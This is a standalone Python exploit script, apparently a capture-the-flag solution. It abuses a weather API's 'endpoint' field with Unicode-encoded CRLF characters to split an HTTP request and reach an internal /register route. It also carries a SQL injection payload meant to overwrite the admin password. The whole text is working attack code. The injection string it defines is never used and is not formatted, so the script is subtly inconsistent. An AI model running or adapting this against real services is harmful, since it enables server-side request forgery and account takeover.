#!/usr/bin/env python3

import requests

url = "http://<URL>"
username = "admin"
password = "password"

injection = "1337') ON CONFLICT(username) DO UPDATE SET password ='{password}';--"

parsedPassword = password.replace(" ", "\u0120").replace("'", "%27")

contentlength = 19 + len(username) + len(parsedPassword)

endpoint = f"127.0.0.1/\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010A\u010D\u010APOST\u0120/register\u0120HTTP/1.1\u010D\u010AHost:\u0120127.0.0.1\u010D\u010AContent-Type:\u0120application/x-www-form-urlencoded\u010D\u010AContent-Length:\u0120{str(contentlength)}\u010D\u010A\u010D\u010Ausername={str(username)}&password={str(parsedPassword)}\u010D\u010A\u010D\u010AGET\u0120/"

a = requests.post(url +'/api/weather', json={'endpoint': endpoint,'city':'Dallas','country':'US'})

if "Could not find" in a.text:
    exit(f"Changed admin password to \"{password}\"")
